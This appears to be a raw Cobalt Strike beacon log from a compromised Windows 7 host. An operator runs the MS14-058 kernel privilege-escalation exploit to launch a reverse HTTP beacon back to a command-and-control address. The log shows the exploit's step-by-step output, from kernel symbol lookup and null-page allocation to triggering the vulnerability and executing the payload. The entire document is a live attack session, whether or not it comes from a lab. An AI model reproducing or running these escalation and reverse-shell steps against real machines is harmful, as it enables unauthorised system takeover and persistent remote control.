03/10 18:00:54 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 1096; os: Windows; version: 6.1; beacon arch: x86 (x64)
03/10 18:01:28 [task] 4*******请先提权*******
03/10 18:02:33 [input] <neo> elevate ms14-058 test
03/10 18:02:34 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
03/10 18:02:51 [checkin] host called home, sent: 104503 bytes
03/10 18:02:53 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43520
[*] Parsing SYSTEM_INFO...
[*] 147 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c11000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F641FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F679D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C2A87C30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


